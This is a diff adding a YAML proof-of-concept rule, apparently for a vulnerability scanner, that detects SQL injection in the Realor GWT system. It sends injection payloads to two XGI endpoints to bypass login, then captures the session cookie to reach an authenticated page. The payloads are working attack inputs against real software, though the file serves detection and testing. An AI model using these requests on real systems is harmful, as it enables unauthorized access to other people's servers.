@@ -1,0 +1,30 @@
+name: yaml-poc-realor-gwt-system-sql-injection
+binding: ea40fe3a-3f4c-4300-8ab6-d7f7c26b4cee
+manual: true
+detail: {}
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /ConsoleExternalUploadApi.XGI?key=FarmName&initParams=command_uploadAuthorizeKeyFile__user_admin%27-%27__pwd_password123__serverIdStr_1&sign=7627a11bf8f214451e7929f05299b9f6
+        expression: response.body_string.contains("未查询到符合条件的用户")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /AgentBoard.XGI?user='||'1&cmd=UserLogin
+        expression: response.body_string.contains("CustomInfo") && response.headers["Set-Cookie"].contains("PHPSESSID")
+        output:
+            search: '"PHPSESSID=(?P<PHPSESSID>.*?);".submatch(response.headers["Set-Cookie"])'
+            PHPSESSID: search["PHPSESSID"]
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /Board.XGI
+            headers:
+                Cookie: PHPSESSID={{PHPSESSID}}
+        expression: response.body_string.contains("src=\"custom/")
+expression: r0() || r1() && r2()
